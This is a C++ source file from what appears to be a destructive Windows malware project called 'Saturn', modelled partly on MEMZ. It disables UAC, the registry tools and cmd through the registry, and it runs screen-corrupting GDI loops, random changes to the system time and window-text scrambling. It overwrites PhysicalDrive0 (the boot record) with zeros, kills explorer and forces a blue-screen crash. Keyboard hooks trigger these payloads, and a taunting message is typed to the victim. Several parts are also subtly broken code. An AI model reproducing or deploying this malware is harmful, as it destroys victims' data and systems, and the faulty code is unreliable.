#include "Saturn.h"
// All The Other Stuff In The Actual Code Should Stay, This Is Adding New Code Only.
// Miscellaneous Payload Codes.
// Reference: https://stackoverflow.com/questions/23853489/generate-a-random-unicode-string
wchar_t* SATURN SaturnGenerateRandomUnicodeString(size_t len, size_t start, size_t end) {
    wchar_t* ustr = new wchar_t[len+1]; // +1 for '\0'
    size_t intervalLength = end - start + 1; // +1 for inclusive range

    srand(time(NULL));
    for (auto i = 0; i < len; i++) {
        ustr[i] = (rand() % intervalLength) + start;
    }
    ustr[len] = L'\0';
    return ustr;
}
// Reference: https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html
INT SATURN FindProcessId(const CHAR *procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    INT pid = 0;
    BOOL hResult;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    // initializing size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &pe);

    // retrieve information about the processes
    // and exit if unsuccessful
    while (hResult) {
        // if we find the process: return process ID
        if (strcmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(hSnapshot);
    return pid;
}
// Decide Some Time If This Function Should Be A Thread Or A Function As Is.
DWORD SATURN ApplyRegistryChanges() {
    // TODO: Scancode Map.
    // Scancode Map Registry Code.
    // All Variables Needed For Registry Editing.
    HKEY hKey;
    LPSTR AutoAdminLogonValue = "0";
    DWORD AutoRestartShellValue = 0;
    DWORD DisableCADValue = 1;
    DWORD EnableLUAValue = 0;
    DWORD shutdownwithoutlogonvalue = 0;
    DWORD DisableRegistryToolsValue = 1;
    DWORD UseDefaultTileValue = 1;
    DWORD DisableLogonBackgroundImageValue = 1;
    DWORD DisableCMDValue = 2;
    DWORD AutoColorizationValue = 1;
    LPSTR SwapMouseButtonsValue = "1";
    DWORD cbsize = sizeof(DWORD);

    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Control\\ Keyboard Layout", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, "Scancode Map", 0, REG_BINARY, (HEX *)scankeysarray, scankeysarray_len);
    // Get Open Command And Runas Command Values From Original Code.
    // Get Userinit Code From Original Code.
    // This Is Not Accurate Code. Copy From Original Regedit Codes. The Code Here Is Different.
    // All HKLM\\SOFWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon Values.
    // CONTAINS: AutoAdminLogon REG_SZ, AutoRestartShell REG_DWORD, DisableCAD REG_DWORD.
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, "AutoAdminLogon", 0, REG_SZ, AutoAdminLogonValue, strlen(AutoAdminLogonValue)+1);
    RegSetValueEx(hKey, "AutoRestartShell", 0, REG_DWORD, AutoRestartShellValue, &cbsize);
    RegSetValueEx(hKey, "DisableCAD", 0, REG_DWORD, DisableCADValue, &cbsize);
    hKey = (HKEY)NULL;
    // All HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Values.
    // CONTAINS: EnableLUA REG_DWORD, shutdownwithoutlogon REG_DWORD
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, "EnableLUA", 0, REG_DWORD, EnableLUAValue, &cbsize);
    RegSetValueEx(hKey, "shutdownwithoutlogon", 0, REG_SZ, shutdownwithoutlogonvalue, &cbsize);
    hKey = (HKEY)NULL;
    // All HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Values.
    // CONTAINS: DisableRegistryTools REG_DWORD.
    RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, "DisableRegistryTools", 0, REG_DWORD, DisableRegistryToolsValue, &cbsize);
    hKey = (HKEY)NULL;
    // All Windows\\CurrentVersion\\Policies\\Explorer Values.
    // CONTAINS: UseDefaultTile REG_DWORD.
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, "UseDefaultTile", 0, REG_DWORD, UseDefaultTileValue, &cbsize);
    hKey = (HKEY)NULL;
    // All Policies\\Microsoft\\Windows\\System.
    // CONTAINS: DisableLogonBackgroundImage REG_DWORD, DisableCMD REG_DWORD.
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, "DisableLogonBackgroundImage", 0, REG_DWORD, DisableLogonBackgroundImageValue, &cbsize);
    RegSetValueEx(hKey, "DisableCMD", 0, REG_DWORD, DisableCMDValue, &cbsize);
    hKey = (HKEY)NULL;
    // All HKCU\\Control Panel Values In Desktop And Mouse Subkeys.
    // CONTAINS: DesktopSubkey: AutoColorization REG_ MouseSubkey: SwapMouseButtons REG_.
    RegOpenKeyEx(HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, "AutoColorization", 0, REG_DWORD, AutoColorizationValue, &cbsize);
    hKey = (HKEY)NULL;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Control Panel\\Mouse", 0, KEY_ALL_ACCESS, &hKey);
    RegSetValueEx(hKey, "SwapMouseButtons", 0, REG_SZ, SwapMouseButtonsValue, strlen(SwapMouseButtonsValue)+1);
    hKey = (HKEY)NULL;
}
// For January 14th Payload.
// TODO: MAKE A CUSTOM FUNCTION (as a thread) FOR STARTING ALL THE MESSAGE BOX THREADS INFINITELY.
// For Flashing Windows.
DWORD SATURN SaturnFlashWindows(LPVOID parameter) {
    while (TRUE) {
        Sleep(random() % 500);
        EnumChildWindows(GetDesktopWindow(), &FlashEnumChildProc, NULL);
    }
}
// The FlashEnumChildProc Code.
BOOL CALLBACK FlashEnumChildProc(HWND hWindow, LPARAM lParam) {
    FLASHWINFO windowflashparam = {
        sizeof(FLASHWINFO),
        hWindow,
        FLASHW_ALL,
        1,
        random() % 500
    };
    FlashWindowEx(&windowflashparam);
    return TRUE;
}
// For GDI.
DWORD SATURN JanuaryGDI(LPVOID parameter) {
    HDC hdc = GetDC(0);
    INT scrw = GetSystemMetrics(SM_CXSCREEN);
    INT scrh = GetSystemMetrics(SM_CYSCREEN);
    while (TRUE) {
        Sleep(random() % 500 + 65 - 36);
        BitBlt(hdc, random() % scrw, random() % scrh, scrw, scrh, random() % scrw, random() % scrh, SRCINVERT);
        Sleep(100);
    }
}
// For October 21st Payload. Partial Reference: https://stackoverflow.com/questions/65607622/desktop-elements-with-winapi
DWORD SATURN MoveIconsGDI() {
    /*CComPtr < IShellWindows > spShellWindows;
    CComPtr < IShellBrowser > spBrowser;
    CComPtr < IDispatch > spDispatch;
    CComPtr < IShellView > spShellView;
    CComPtr < IFolderView > spView;
    CComPtr < IShellFolder > spFolder;
    CComPtr < IEnumIDList > spEnum;
    CComHeapPtr < ITEMID_CHILD > spidl;
    CComVariant vtLoc(CLSID_ShellWindows);
    CComVariant vtEmpty;

    HRESULT hr;
    long lhWnd;

    // INITIALIZE COM
    CoInitialize(NULL);

    // GET ShellWindows INTERFACE
    hr = spShellWindows.CoCreateInstance(CLSID_ShellWindows);

    // FIND WINDOW
    hr = spShellWindows->FindWindowSW(
        &vtLoc, &vtEmpty, SWC_DESKTOP, &lhWnd, SWFO_NEEDDISPATCH, &spDispatch);

    // GET DISPATCH INTERFACE
    CComQIPtr < IServiceProvider > (spDispatch)->
    QueryService(SID_STopLevelBrowser, IID_PPV_ARGS(&spBrowser));

    spBrowser->QueryActiveShellView(&spShellView);
    spShellView->QueryInterface(IID_PPV_ARGS(&spView));

    hr = spView->GetFolder(IID_PPV_ARGS(&spFolder));

    // GET ENUMERATOR
    spView->Items(SVGIO_ALLVIEW, IID_PPV_ARGS(&spEnum)); // get enumerator

    INT scrw = GetSystemMetrics(SM_CXSCREEN);
    INT scrh = GetSystemMetrics(SM_CYSCREEN);
    spEnum->Next(325, &spidl, NULL);
    
    PCITEMID_CHILD apidl[] = {
        spidl
    };

    for (INT t = 0; t < 60; t++) {
        POINT iconpoint = {
            random() % scrw,
            random() % scrh
        };
        Sleep((1000 * 2) + 500);
        spView->SelectAndPositionItems(325, apidl, &niconpoint, SVSI_POSITIONITEM);
        Sleep((1500 * 2) - 500);
    }
    CoUninitialize(); // Release COM After Completion Of Function. */
    HWND prog = FindWindow("progman", NULL);
    HWND shell = FindWindowEx(prog, NULL, "shelldll_defview", NULL);
    HWND listview = FindWindowEx(shell, NULL, "syslistview32", NULL);
    INT iconsnum = ListView_GetItemCount(listview);
    INT scrw = GetSystemMetrics(SM_CXSCREEN);
    INT scrh = GetSystemMetrics(SM_CYSCREEN);

    while (TRUE) {
        ListView_SetItemPosition(listview, random() % iconsnum, random() % scrw, random() % scrh);      
        Sleep(random() % 150);
    }
}
// For March 9th Payload.
DWORD SATURN MarchGDI(LPVOID parameter) {
    HDC hdc = GetDC(0);
    INT scrw = GetSystemMetrics(SM_CXSCREEN);
    INT scrh = GetSystemMetrics(SM_CYSCREEN);

    // Slow.
    for (INT s = 0; s < 5; s++) {
        BitBlt(hdc, random() % scrw, random() % scrh, scrw, scrh, random() % scrw, random() % scrh, ERODE);
        Sleep(random() % 10000 - 500 / 2 * 5);
    }
    // Medium.
    for (INT c = 0; c < 12; c++) {
        BitBlt(hdc, random() % scrw, random() % scrh, scrw, scrh, random() % scrw, random() % scrh, ERODE);
        Sleep(random() % 5000 / 2);
    }
    // Fast.
    for (INT n = 0; n < 60; n++) {
        BitBlt(hdc, random() % scrw, random() % scrh, scrw, scrh, random() % scrw, random() % scrh, ERODE);
        Sleep(random() % 500);
    }
    ExitThread(0);
}
// For August 8th Payload.
// Infinite Thread For Infinite Time Changing. Calling It: CreateThread(NULL, 65536, &SaturnTimeCurse, NULL, NULL, NULL);
DWORD SATURN SaturnTimeCurse(LPVOID parameter) {
    while (TRUE) {
        Sleep(500 * 2);
        // Do Check If random() % 30827 + 1601 Is Correct Or random() % 29226 + 1601 Is Correct.
        SYSTEMTIME systime = {
            random() % 29226 + 1601,
            random() % 12,
            random() % 31,
            random() % 24,
            random() % 60,
            random() % 60,
            random() % 1000
        };

        SetLocalTime(&systime);
        SetSystemTime(&systime);
        ZeroMemory(&systime, sizeof(systime));
        Sleep(500 * 2);
    }
}
// Reversing Strings. Calling It: CreateThread(NULL, 65536, &SaturnReverseWindowText, NULL, NULL, NULL); Reference: Memz Source Code, payloads.cpp, payloadChangeText, Lines 132 - 137.
DWORD SATURN SaturnReverseWindowText(LPVOID parameter) {
    while (TRUE) {
        Sleep(random() % 500 * 2);
        EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
        Sleep(random() % 500 * 2);
    }
}
// EnumChildProc Code. Reference: Memz Source Code, payloads.cpp, EnumChildProc,  Lines 139 - 150.
BOOL CALLBACK EnumChildProc(HWND hWindow, LPARAM lParam) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

    if (SendMessageTimeoutW(hWindow, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
        SaturnStrReverseW(str);
        SendMessageTimeoutW(hWindow, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
    }

    GlobalFree(str);
    return TRUE;
}
// SaturnStrReverseW Code. Reference: Memz Source Code , utils.cpp, strReverseW, Lines 15 - 36.
VOID SATURN SaturnStrReverseW(LPWSTR str) {
    INT len = lstrlenW(str);
    WCHAR c;
    INT i,
    j;

    if (len <= 1) {
        return;
    }

    for (i = 0, j = len - 1; i < j; i++, j--) {
        c = str[i];
        str[i] = str[j];
        str[j] = c;
    }

    // Fixes CR/LF.
    for (i = 0; i < len - 1; i++) {
        if (str[i] == L'\n' && str[i + 1] == L'\r') {
            str[i] = L'\r';
            str[i + 1] = L'\n';
        }
    }
}
// Make Certain Searches Open In Browser. Calling It: CreateThread(NULL, 65536, &SaturnRandomSearches, NULL, NULL, NULL);
DWORD SATURN SaturnRandomSearches(LPVOID parameter) {
    while (TRUE) {
        Sleep(random() % 500 * 12 + 100);
        Sleep(random() % 600 * 12 + 50);
        ShellExecute(NULL, "open", (LPCSTR)sites[random() % nSites], NULL, NULL, SW_SHOWNORMAL);
        Sleep(random() % 666);
        Sleep(random() % 750);
        Sleep(random() % 123 * 2 + random() % 345);
    }
}
// Start Random Applications. Calling It: CreateThread(NULL, 65536, &SaturnRandomApplicationStart, NULL, NULL, NULL);
DWORD SATURN SaturnRandomApplicationStart(LPVOID parameter) {
    while (TRUE) {
        Sleep(random() % 2345 * 2 + 45);
        Sleep(random() % 6250);
        ShellExecute(NULL, "open", (LPCSTR)progs[random() % nProgs], NULL, NULL, SW_SHOWNORMAL);
        Sleep(random() % 666);
        Sleep(random() % 720);
        Sleep(random() % 1111);
    }
}
// Play Random Error Sounds. Calling It: CreateThread(NULL, 65536, &SaturnPlayErrorSounds, NULL, NULL, NULL);
DWORD SATURN SaturnPlayErrorSounds(LPVOID parameter) {
    while (TRUE) {
        Sleep(random() % 45000 / 9);
        PlaySound(sounds[random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
        Sleep(100 * 10);
    }
}
// Custom GDI. Calling It: CreateThread(NULL, 65536, &SCatGDI, NULL, NULL, NULL);
DWORD SATURN SCatGDI(LPVOID parameter) {
    HDC hdc = GetDC(0);
    INT scrw = GetSystemMetrics(SM_CXSCREEN);
    INT scrh = GetSystemMetrics(SM_CYSCREEN);
    while (TRUE) {
        Sleep(random() % 500 * 4 / 2);
        BitBlt(hdc, random() % scrw, random() % scrh, scrw, scrh, random() % scrw, random() % scrh, SATURNICDEATH);
        Sleep(random() % 500 * 10 / 2);
        Sleep(random() % 50 * 3);
        BitBlt(hdc, random() % scrw, random() % scrh, scrw, scrh, random() % scrw, random() % scrh, NEPTUNICDEATH);
        Sleep(random() % 500 * 5 / 2);
        Sleep(random() % 50 * 2);
        BitBlt(hdc, random() % scrw, random() % scrh, scrw, scrh, random() % scrw, random() % scrh, SONICDEATH);
        Sleep(random() % 500 * 3);
        Sleep(random() % 50 + random() % 750);
        Sleep(random() % 666);
        
        // A Different Version. *TEST BEFORE USE.*
        Sleep(random() % 500 * 4 / 2);
        BitBlt(hdc, random() % scrw, random() % scrh, scrw, scrh, random() % scrw, random() % scrh, augustgdi[random() % nAugustGDI]);
        Sleep(random() % 500 * 10 / 2);
        Sleep(random() % 50 * 3);
    }
}

// Some Hook-Needed Codes.
// For August 8th Final Part.
DWORD SATURN SonicRestart() {
    HANDLE token;
    TOKEN_PRIVILEGES privileges;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);

}
DWORD SATURN SonicDeath() {
    HANDLE mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

    DWORD dwBytesWritten = 0;
    BYTE *scode = (BYTE *)LocalAlloc(LMEM_ZEROINIT, 2000000);
    ZeroMemory(&scode, sizeof(scode));
    // Or: FillMemory(scode, sizeof(scode), 0); Possible Undefined Results.
    WriteFile(mbr, scode, 2000000, &dwBytesWritten, (LPOVERLAPPED)NULL);
}
// For September 18th Final Part.
DWORD SATURN SlowDeath() {
    CHAR glchr[2] = 0;
    // J.I.C
    SendMessage(hWnd, EM_SETMODIFY, (WPARAM)TRUE, (LPARAM)0);
    for (INT i = 0; goodluck[2]; i++) {
        glchr = goodluck[i];
        Sleep(500);
        SendMessage(hWnd, WM_SETTEXT, (WPARAM)0, (LPARAM)glchr);
    }
    SendMessage(hWnd, EM_SETMODIFY, (WPARAM)FALSE, (LPARAM)0);
    VoidLock();
}
DWORD SATURN InstantDeath() {
    for (INT i = 0; i < 7; i++) {
        wchar_t* unicodestrings = SaturnGenerateRandomUnicodeString(4096, 0x0400, 0x04FF);
        SendMessage(hWnd, WM_SETTEXT, (WPARAM)0, (LPARAM)unicodestrings);
    }
    BlockInput(TRUE);
    Beep(1000, random() % 30000);
    BlockInput(FALSE);
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1;
        DWORD tmp2;
        ((VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((VOID(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(STATUS_SYSTEM_PROCESS_TERMINATED, 0, 0, 0, 6, &tmp2);
    }

}
DWORD SATURN WinDestroy() {
    INT npid = 0;
    for (; npid != 0; npid = PidFind("notepad.exe")) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, npid);
        TerminateProcess(hProcess, TRUE);
    }
    // If The Above Doesn't Work.
    while (npid) {
        npid = PidFind("notepad.exe");
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, npid);
        TerminateProcess(hProcess, TRUE);
    }
    BlockInput(TRUE);
    Beep(1000, random() % 30000);
    BlockInput(FALSE);
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1;
        DWORD tmp2;
        ((VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((VOID(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(STATUS_SYSTEM_PROCESS_TERMINATED, 0, 0, 0, 6, &tmp2);
    }
}
DWORD SATURN VoidLock() {
    HANDLE token;
    TOKEN_PRIVILEGES privileges;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &privileges.Privileges[0].Luid);
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

    INT expid = 0;
    for (; expid != 0; expid = PidFind("explorer.exe")) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, expid);
        TerminateProcess(hProcess, TRUE);
    }
    // If The Above Doesn't Work.
    while (expid) {
        expid = PidFind("explorer.exe");
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, expid);
        TerminateProcess(hProcess, TRUE);
    }
    // Kill Notepad.
    INT npid = 0;
    for (; npid != 0; npid = PidFind("notepad.exe")) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, npid);
        TerminateProcess(hProcess, TRUE);
    }
    // If The Above Doesn't Work.
    while (npid) {
        npid = PidFind("notepad.exe");
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, npid);
        TerminateProcess(hProcess, TRUE);
    }
    ShellExecute(NULL, "open", "taskmgr", NULL, NULL, SW_SHOWNORMAL); // Starting Task Manager.
    ShellExecute(NULL, "open", "cmd", NULL, NULL, SW_SHOWNORMAL); // Starting Cmd.
    ShellExecute(NULL, "open", "mspaint", NULL, NULL, SW_SHOWNORMAL); // Starting Paint.
    // Put MessageBox Generating Code From Original Code Below.

    HANDLE FINALGDI = CreateThread(NULL, 65536, &MarchGDI, NULL, NULL, NULL); // The Slow ERODING GDI. THIS IS A INFINITE THREAD.
    WaitForSingleObject(FINALGDISLOW, random() % INFINITE);
    // Final Message.
    // Message To Autotype: "I Feel Petty, To Make Someone This Smart I Mean An Idiot To Suffer Like This, Never Seen Anything Like This Have You, No One Will Help You, If Anyone Does, You Will Be Surprised, But That Feeling Won't Last For Long."
    CHAR voidlockdeathmessage[2] = "I Feel Petty, To Make Someone This Smart I Mean An Idiot To Suffer Like This, Never Seen Anything Like This Have You, No One Will Help You, If Anyone Does, You Will Be Surprised, But That Feeling Won't Last For Long.";
    CHAR voidlockdeathchr[2] = 0;
    ShellExecute(NULL, "open", "notepad", NULL, NULL, SW_SHOWNORMAL);
    HWND parhWnd = FindWindow("Notepad", "Untitled - Notepad");
    HWND hWnd = FindWindowEx(parhWnd, NULL, "Edit", NULL);
    BlockInput(TRUE);
    for (INT i = 0; voidlockdeathmessage[2]; i++) {
        voidlockdeathchr = voidlockdeathmessage[i];
        Sleep(500);
        SendMessage(hWnd, WM_SETTEXT, (WPARAM)0, (LPARAM)voidlockdeathchr);
    }
    Beep(1000, random() % 30000);
    BlockInput(FALSE);
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1;
        DWORD tmp2;
        ((VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((VOID(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(STATUS_SYSTEM_PROCESS_TERMINATED, 0, 0, 0, 6, &tmp2);
    }
}
// SaturnKeyboardHook Code. Called Like This: HHOOK hSaturnKeyBoardHook = SetWindowsHookEx(WH_KEYBOARD, SaturnKeyboardHook, 0, GetCurrentThreadId());
LRESULT CALLBACK SaturnKeyboardHook(INT code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        if (wParam == 0x59 && wParam != VK_BACK || VK_DELETE) {
            if (wParam == 0x45 && wParam != VK_BACK || VK_DELETE) {
                if (wParam == 0x53 && wParam != VK_BACK || VK_DELETE) {
                    SlowDeath();
                }
                continue;
            }
            continue;
        }
        else if (wParam == 0x4E && wParam != VK_BACK || VK_DELETE) {
            if (wParam == 0x4F && wParam != VK_BACK || VK_DELETE) {
                InstantDeath();
            }
            continue;
        }
        continue;
    }
    return CallNextHookEx(0, code, wParam, lParam);
}
// An Alternate Function For Keyboard Hook.
// Check Before Using Any Of These Methods.
LRESULT CALLBACK AltSaturnKeyboardHook(INT code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        switch (wParam) {
            case 0x59: {
                case 0x45: {
                    case 0x53: {
                        // yes.
                    }
                }
            }
            break;
            case 0x4E: {
                case 0x4F: {
                    // no.
                }
            }
            break;
        }
    }
    return CallNextHookEx(0, code, wParam, lParam);
}
// CloseWndCheckHook Code. Called Like This: HHOOK hCloseWndCheckHook = SetWindowsHookEx(WH_CBT, CloseWndCheckHook, 0, GetCurrentThreadId());
LRESULT CALLBACK CloseWndCheckHook(INT nCode, WPARAM wParam, LPARAM lParam) {
    HWND hWnd = FindWindow("Notepad", "Untitled - Notepad");
    if (nCode == HCBT_DESTROYWND) {
        if (wParam == hWnd) {
            WinDestroy();
        }
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}